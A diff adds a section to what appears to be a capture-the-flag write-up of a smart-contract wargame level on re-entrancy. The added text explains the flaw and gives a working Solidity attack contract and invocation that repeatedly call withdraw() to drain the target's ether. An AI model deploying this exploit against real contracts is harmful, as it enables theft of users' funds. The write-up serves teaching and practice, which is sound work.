@@ -255,3 +255,44 @@ I deployed the above contract and invoked it with the following, which completed
 ```
 await con.methods.usurp(contract.address).send({value:wei("0.0015")})
 ```
+
+# Level 10: Re-entrancy
+
+This is a famous vulnerability. The code provided here allows you to `withdraw()` some balance, but it sends the balance with the `call()` method, which doesn't have a strict gas limit (as it did the previous level). In this case, this allows me to call `withdraw()` again from the `receive()` method, and since the level contract doesnt perform bookkeeping until after the transfer, we are able to withdraw balance as many times as we like (or at least until we run out of gas).
+
+I built and deployed the following contract, and then executed the exploit with the following invocation:
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract Level10 {
+    address private victim;
+    uint256 private withdrawAmount;
+    function attack(address victimAddress) payable external {
+        victim = victimAddress;
+        withdrawAmount = msg.value;
+        Reentrance(victim).donate{value:msg.value}(address(this));
+        Reentrance(victim).withdraw(withdrawAmount);
+    }
+
+    receive() external payable {
+        Reentrance(victim).withdraw(withdrawAmount);
+    }
+}
+
+interface Reentrance {
+  function balanceOf ( address _who ) external view returns ( uint256 balance );
+  function balances ( address ) external view returns ( uint256 );
+  function donate ( address _to ) external payable;
+  function withdraw ( uint256 _amount ) external;
+}
+```
+```
+con.methods.attack(contract.address).send({value:toWei("0.0005")});
+```
+
+The target contract started off with 0.001 ether, so I just needed to start this process with a number that will multiply into 0.001. 0.001 would have already been enough, but I used 0.0005 just to give my exploit a chance to stretch its legs. This worked, and completed the level.
+
+> A lesson from this level: Transferring balance to contracts is dangerous, whether you use a limited-gas method or an unlimited-gas method.
+
+Something to note here is that `revert()` doesn't "bubble up" through a `call()` invocation. This is why I didn't have to be careful with terminating my re-entrancy loop the right way. At some point I would call `withdraw()` and it would fail and revert, but this wouldn't revert all of my sneaky work up to that point, just the execution of the deepest (failing) `withdraw()`.
